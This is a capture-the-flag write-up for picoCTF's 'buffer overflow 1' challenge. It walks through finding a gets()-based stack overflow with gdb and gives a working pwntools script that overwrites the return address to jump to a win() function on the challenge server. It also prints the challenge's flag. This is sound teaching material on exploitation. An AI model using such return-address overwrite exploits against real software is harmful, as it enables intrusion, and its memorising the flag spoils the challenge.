# buffer overflow 1

**Author:** [yairp03](https://github.com/yairp03)  
**Category:** Binary Exploitation  
**Points:** 200

# Challenge

## Description

Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the [program](./vuln).  
You can view source [here](./vuln.c). And connect with it using `nc saturn.picoctf.net 51949`

## Source

[vuln.c](./vuln.c) (C source)  
[vuln](./vuln) (32-bit ELF)

# Solution

Let's look at the given source code:
    
```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){
  ...
  vuln();
  ...
}
```

As the title hints, the program is vulnerable to [buffer overflow](/Guides/Vulnerabilities/Buffer%20Overflow%20Vulnerability.md) through the `gets()` function. That means we can overwrite the return address of the `vuln()` function, and make it return to the `win()` function, which prints the flag. Let's check `vuln()`'s stack frame:

```bash
$ gdb ./vuln
(gdb) disas vuln
Dump of assembler code for function vuln:
   ...
   0x0804929a <+25>:    lea    eax,[ebp-0x28]
   0x0804929d <+28>:    push   eax
   0x0804929e <+29>:    call   0x8049050 <gets@plt>
   ...
End of assembler dump.
```

`buf` is located at `[ebp-0x28]`, so the stack frame looks like this:

```
[ebp-0x28]  buf (size 32)
[ebp-0x08]  ? (DWORD)
[ebp-0x04]  ? (DWORD)
[ebp+0x00]  old ebp (DWORD)
[ebp+0x04]  return address (DWORD)
```

Our input should have 44 bytes of padding, and then the address of `win()`. We can find the address of `win()` using `disas`:

```bash
(gdb) disas win
Dump of assembler code for function win:
   0x080491f6 <+0>:     endbr32
   ...
```

The address of `win()` is `0x80491f6`. Now we can write the exploit using [pwntools](/Guides/Tools/pwntools.md):

```python
from pwn import *

conn = remote('saturn.picoctf.net', 51949)

conn.recvuntil(b'Please enter your string: \n')
conn.sendline(b'A' * 44 + p32(0x80491f6)) # win() address

conn.recvline()
flag = conn.recvuntil(b'}').decode()

print('Flag:', flag)
```

```
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```

**The Flag:** `picoCTF{addr3ss3s_ar3_3asy_6462ca2d}`
